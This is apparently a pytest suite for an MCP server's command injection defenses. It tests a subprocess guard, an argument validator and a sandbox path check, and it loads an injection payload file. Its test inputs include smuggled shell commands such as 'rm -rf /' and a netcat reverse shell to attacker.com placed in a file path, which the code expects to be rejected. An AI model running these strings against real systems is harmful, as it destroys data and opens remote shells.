"""
Command injection defense tests.

Tests three layers of defense:
    1. Unit tests for src.security.subprocess_guard
    2. Unit tests for src.security.command_validator
    3. Integration tests against the secure MCP server (port 8766)
"""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
import time

import pytest

from mcp import ClientSession
from mcp.client.sse import sse_client

from src.security.subprocess_guard import safe_subprocess_run, SecurityError
from src.security.command_validator import validate_command_arg
from src.validators import validate_sandbox_path


# ---------------------------------------------------------------------------
# Payload loading (module-level for parametrize)
# ---------------------------------------------------------------------------

_PAYLOADS_PATH = os.path.join(
    os.path.dirname(__file__), "..", "exploits", "payloads.json"
)
with open(_PAYLOADS_PATH) as _f:
    _ALL = json.load(_f)

COMMAND_INJECTION = [
    (p["name"], p["payload"])
    for p in _ALL
    if p.get("category") == "command_injection"
]


# ---------------------------------------------------------------------------
# Unit tests: subprocess_guard
# ---------------------------------------------------------------------------


class TestSubprocessGuard:
    """Tests for src.security.subprocess_guard.safe_subprocess_run."""

    def test_safe_run_echo_succeeds(self):
        result = safe_subprocess_run(["echo", "hello"], capture_output=True, text=True)
        assert result.returncode == 0
        assert "hello" in result.stdout

    def test_shell_true_raises_security_error(self):
        with pytest.raises(SecurityError, match="shell=True is forbidden"):
            safe_subprocess_run(["echo", "hello"], shell=True)

    def test_string_cmd_raises_security_error(self):
        with pytest.raises(SecurityError, match="cmd must be a list"):
            safe_subprocess_run("echo hello")  # type: ignore[arg-type]

    def test_semicolon_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello; rm -rf /"])

    def test_backtick_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello`whoami`"])

    def test_pipe_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello | cat"])

    def test_ampersand_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello&"])

    def test_dollar_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello$HOME"])

    def test_redirect_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello > file.txt"])

    def test_newline_in_arg_raises(self):
        with pytest.raises(SecurityError, match="Forbidden shell metacharacter"):
            safe_subprocess_run(["echo", "hello\nrm -rf /"])

    def test_legitimate_path_with_hyphen_ok(self):
        result = safe_subprocess_run(
            ["echo", "my-file.txt"], capture_output=True, text=True
        )
        assert result.returncode == 0

    def test_legitimate_path_with_underscore_ok(self):
        result = safe_subprocess_run(
            ["echo", "my_file.txt"], capture_output=True, text=True
        )
        assert result.returncode == 0


# ---------------------------------------------------------------------------
# Unit tests: command_validator
# ---------------------------------------------------------------------------


class TestCommandValidator:
    """Tests for src.security.command_validator.validate_command_arg."""

    def test_valid_alphanumeric(self):
        assert validate_command_arg("hello123") == "hello123"

    def test_valid_with_underscore(self):
        assert validate_command_arg("my_file") == "my_file"

    def test_valid_with_dot_slash_hyphen(self):
        assert validate_command_arg("./my-file.txt") == "./my-file.txt"

    def test_empty_string_raises(self):
        with pytest.raises(ValueError, match="empty or whitespace"):
            validate_command_arg("")

    def test_whitespace_only_raises(self):
        with pytest.raises(ValueError, match="empty or whitespace"):
            validate_command_arg("   ")

    def test_semicolon_raises(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_command_arg("hello; rm -rf /")

    def test_backtick_raises(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_command_arg("hello`whoami`")

    def test_pipe_raises(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_command_arg("hello | cat")

    def test_ampersand_raises(self):
        with pytest.raises(ValueError, match="forbidden characters"):
            validate_command_arg("hello&")

    def test_overlong_arg_raises(self):
        with pytest.raises(ValueError, match="exceeds max length"):
            validate_command_arg("x" * 4097)


# ---------------------------------------------------------------------------
# Unit tests: validators.validate_sandbox_path shell metacharacter check
# ---------------------------------------------------------------------------


class TestValidateSandboxPathShellMeta:
    """Tests that validate_sandbox_path rejects shell metacharacters."""

    SANDBOX = "/tmp/mcp_sandbox_secure"

    def test_semicolon_path_raises(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            validate_sandbox_path("hello.txt; rm -rf /", self.SANDBOX)

    def test_backtick_path_raises(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            validate_sandbox_path("hello.txt`whoami`", self.SANDBOX)

    def test_pipe_path_raises(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            validate_sandbox_path("hello.txt | /bin/sh", self.SANDBOX)

    def test_ampersand_path_raises(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            validate_sandbox_path("hello.txt & nc -e /bin/sh attacker.com 4444", self.SANDBOX)

    def test_legitimate_path_ok(self):
        path = validate_sandbox_path("hello.txt", self.SANDBOX)
        assert str(path).endswith("hello.txt")

    def test_legitimate_subdir_path_ok(self):
        path = validate_sandbox_path("subdir/my-file.txt", self.SANDBOX)
        assert str(path).endswith("subdir/my-file.txt")


# ---------------------------------------------------------------------------
# Server fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def secure_server():
    proc = subprocess.Popen(
        ["python3", "src/probe_server_secure.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(3)
    yield
    proc.terminate()
    proc.wait(timeout=5)


# ---------------------------------------------------------------------------
# MCP client helper
# ---------------------------------------------------------------------------


def call_tool_sync(port: int, tool_name: str, arguments: dict, timeout: int = 10):
    """Call an MCP tool synchronously via SSE transport."""

    async def _call():
        async with sse_client(f"http://127.0.0.1:{port}/sse") as (read_stream, write_stream):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()
                result = await session.call_tool(tool_name, arguments)
                return result

    return asyncio.run(asyncio.wait_for(_call(), timeout=timeout))


def _result_text(result) -> str:
    """Extract text from a CallToolResult."""
    parts = []
    for block in result.content:
        if hasattr(block, "text"):
            parts.append(block.text)
    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Integration tests: secure server blocks command injection payloads
# ---------------------------------------------------------------------------


class TestSecureServerCommandInjection:
    """Command injection payloads are blocked by the secure server."""

    @pytest.fixture(autouse=True, scope="class")
    def _start(self, secure_server):
        pass

    @pytest.mark.parametrize("name,payload", COMMAND_INJECTION)
    def test_command_injection_blocked(self, name, payload):
        if "target_tool" in payload:
            tool = payload["target_tool"]
        else:
            tool = "read_secure_file"
        result = call_tool_sync(8766, tool, payload)
        assert result.isError, f"{name}: expected isError=True"
        text = _result_text(result).lower()
        assert "shell" in text or "security" in text or "traversal" in text, (
            f"{name}: expected shell/security/traversal error, got: {text[:100]}"
        )

    def test_legitimate_file_read_ok(self):
        result = call_tool_sync(8766, "read_secure_file", {"path": "hello.txt"})
        text = _result_text(result)
        assert "[OK]" in text
        assert not result.isError

    def test_legitimate_write_ok(self):
        result = call_tool_sync(
            8766, "write_file", {"path": "cmd_test.txt", "content": "safe content"}
        )
        text = _result_text(result)
        assert "[OK]" in text
        assert not result.isError
